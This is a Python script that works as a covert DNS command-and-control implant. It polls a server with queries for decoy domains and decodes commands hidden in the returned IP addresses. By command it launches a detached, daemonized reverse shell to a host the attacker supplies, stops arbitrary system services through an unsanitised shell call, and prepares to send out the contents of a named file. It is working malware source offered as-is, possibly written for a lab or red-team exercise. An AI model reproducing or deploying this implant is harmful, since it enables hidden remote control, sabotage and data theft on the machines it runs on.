import socket
import struct
import sys
import time
import os

WAIT_TIME = 10

if (len(sys.argv) != 2):
    print("Usage: server.py {ip to send to}")
    exit
else:
    SERVER = sys.argv[1]

def makeQuery(address):
    query = b'\x12\x34'  # Transaction ID
    query += b'\x01\x00'  # Flags
    query += b'\x00\x01'  # QDCOUNT
    query += b'\x00\x00'  # ANCOUNT
    query += b'\x00\x00'  # NSCOUNT
    query += b'\x00\x00'  # ARCOUNT
    for part in address.split('.'):
        query += bytes([len(part)]) + part.encode()
    query += b'\x00' + b'\x00\x01' + b'\x00\x01'
    return query

def getResponse(data):
    answers = []
    try:
        header = data[:12]
        qdcount = struct.unpack("!H", header[4:6])[0]
        ancount = struct.unpack("!H", header[6:8])[0]
        offset = 12

        # Skip over the query section
        for _ in range(qdcount):
            while data[offset] != 0:
                offset += data[offset] + 1
            offset += 5  # null byte + QTYPE(2) + QCLASS(2)

        # Now at the start of answer section
        for _ in range(ancount):
            # Skip NAME (2 bytes pointer) + TYPE(2) + CLASS(2) + TTL(4) + RDLENGTH(2)
            if offset + 12 > len(data):
                break
            rtype = struct.unpack("!H", data[offset+2:offset+4])[0]
            rdlength = struct.unpack("!H", data[offset+10:offset+12])[0]
            offset += 12
            if rtype == 1 and rdlength == 4:  # A record
                ip = ".".join(str(b) for b in data[offset:offset+4])
                answers.append(ip)
            offset += rdlength
    except Exception as e:
        print("Parsing error:", e)
    return answers

def formSocket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    return sock
    
def resolveFileName(ips):
    characters = []
    fileName = ""
    for ip in ips:
        ipSplit = ip.split('.')
        for entry in ipSplit:
            characters.append(entry)
    for character in characters:
        if character == "3":
            break
        fileName = fileName + chr(int(character))
        
    return fileName
    
def spawnRevShell(host, port):
    pid = os.fork()
    if pid > 0:
        # Parent returns immediately; 'pid' is the first child's PID (not the final worker)
        sys.stdout.write("Spawned intermediate PID %d\n" % pid)
        return pid

    # First child
    os.setsid()          # new session, detach from TTY
    pid2 = os.fork()
    if pid2 > 0:
        # First child exits; grandchild gets re-parented to init/systemd
        os._exit(0)

    # Grandchild: become the daemonized worker
    try:
        os.chdir("/")
        os.umask(0)

        # Close inherited FDs (except stdio). Redirect stdio to /dev/null.
        try:
            maxfd = os.sysconf("SC_OPEN_MAX")
        except (AttributeError, ValueError):
            maxfd = 256
        for fd in range(3, maxfd):
            try: os.close(fd)
            except OSError: pass

        devnull = os.open("/dev/null", os.O_RDWR)
        os.dup2(devnull, 0)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)

        cmd = ("python3", "/usr/lib64/shellClient.py", host, port)
        os.execvp(cmd[0], cmd)
    except Exception as e:
        os.write(2, ("exec failed: %s\n" % e).encode("utf-8"))
        os._exit(127)

sock = formSocket()
sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
try:
    resp, _ = sock.recvfrom(512)
except socket.timeout:
    pass

time.sleep(WAIT_TIME)

while True:
    timeout = False
    sock.sendto(makeQuery("freegames.net"), (SERVER, 53))
    try:
        resp, _ = sock.recvfrom(512)
    except socket.timeout:
        timeout = True
        pass
    if not timeout:
        ips = getResponse(resp)
        print("Resolved IPs:", ips)
        
        if(len(ips) == 1):
            ipSplit = ips[0].split('.')
            if(ipSplit[3] == "232"): #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
                print("Reverse Shell command recieved")
                sock.sendto(makeQuery("securelogin.com"), (SERVER, 53))
                resp, _ = sock.recvfrom(512)

                ips = getResponse(resp)
                
                address = ips[0]
                portIP = ips[1]
                
                portIPSplit = portIP.split('.')
                port = int(portIPSplit[0]) + int(portIPSplit[1])
                
                if not ((address == "100.100.100.100") and (port == 100)):
                    print("Sending shell to " + address + ":" + str(port)) 
                    spawnRevShell(address, str(port))
            elif(ipSplit[3] == "85"): 
                print("Collecting file contents")
                
                sock.sendto(makeQuery("fileshare.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
                resp, _ = sock.recvfrom(512)

                ips = getResponse(resp)
                
                if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
                    fileName = resolveFileName(ips)
                    
                print("Accessing file: " + fileName)
                
                sock.sendto(makeQuery("cloudlogin.com"), (SERVER, 53)) #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
                resp, _ = sock.recvfrom(512)
                
                ips = getResponse(resp)
                
                address = ips[0]
                portIP = ips[1]
                
                portIPSplit = portIP.split('.')
                port = int(portIPSplit[0]) + int(portIPSplit[1])
                
                if not ((address == "100.100.100.100") and (port == 100)):
                    print("Sending file contents to " + address + ":" + str(port)) 
            elif(ipSplit[3] == "150"):
                print("Collecting service name")
                
                sock.sendto(makeQuery("cloudvault.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
                resp, _ = sock.recvfrom(512)

                ips = getResponse(resp)
                
                if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
                    serviceName = resolveFileName(ips)
                    
                print("Stopping service: " + serviceName)
                os.system("systemctl stop " + serviceName)
                
    time.sleep(WAIT_TIME)
